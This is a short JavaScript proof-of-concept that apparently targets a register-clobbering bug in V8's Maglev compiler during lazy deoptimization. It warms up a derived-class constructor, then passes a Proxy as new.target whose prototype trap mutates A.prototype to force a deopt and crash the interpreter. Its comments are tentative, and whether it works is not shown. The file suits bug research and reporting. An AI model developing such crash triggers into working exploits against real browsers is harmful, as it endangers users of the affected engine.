
// Vulnerability PoC: Register Clobbering in Maglev Lazy Deopt
//
// Target: FindNonDefaultConstructorOrConstruct
// Mechanism:
// 1. Trigger Maglev compilation for a derived constructor C.
// 2. C extends B, B extends A. B is DefaultDerived. A is DefaultBase.
// 3. Maglev optimizes `super()` in C to `FastNewObject(A, new.target)`.
// 4. Maglev pre-clobbers the output register for `found` flag with `true` using `StoreRegister`.
// 5. We arrange for `new.target` to be a Proxy.
// 6. `FastNewObject` calls runtime `NewObject`, which accesses `Proxy.prototype`.
// 7. Proxy trap triggers deoptimization.
// 8. Execution resumes at `FindNonDefaultConstructorOrConstruct` in interpreter.
// 9. The register holding `B` (input) has been overwritten with `true` (output/temp).
// 10. Interpreter crashes or throws when trying to treat `true` as a constructor.

class A {}
class B extends A {}
class C extends B {
  constructor() {
    // This super() call will be optimized.
    // Ignition likely allocates output registers overlapping with inputs if inputs are dead.
    super();
  }
}

function trigger() {
  const p = new Proxy(C, {
    get(target, prop, receiver) {
      if (prop === 'prototype') {
        // Trigger deopt here.
        // We can deopt by changing the map of A?
        // Or simply by being a Proxy, we force slow path?
        // But we need explicit deopt.
        // Let's use a global flag to trigger a map change or something that invalidates C code?
        // C code depends on B and A.
        // If we change B's prototype?
        // Or if we use `deoptimizeNow()` if available.
        if (globalThis.do_deopt) {
           // %DeoptimizeFunction(C); // If allow-natives-syntax
           // Or invalidate a stable map dependency.
           // A is stable.
           A.prototype.x = 1;
        }
      }
      return Reflect.get(target, prop, receiver);
    }
  });

  // Warmup
  for (let i = 0; i < 1000; i++) {
    Reflect.construct(C, [], C);
  }

  // Trigger
  globalThis.do_deopt = true;
  try {
    Reflect.construct(C, [], p);
  } catch (e) {
    print("Caught: " + e);
  }
}

// Helper to run with natives syntax if needed, but trying to be generic.
trigger();
